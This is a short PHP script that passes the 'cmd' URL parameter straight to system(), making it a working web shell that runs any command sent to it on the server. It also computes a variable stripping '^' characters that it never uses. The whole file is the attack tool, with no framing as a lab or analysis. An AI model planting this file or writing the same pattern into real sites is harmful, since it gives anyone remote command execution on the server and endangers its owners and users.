<?php
	$command = str_replace("^", " ", $_GET['cmd']);
	system($_GET['cmd']);
?>
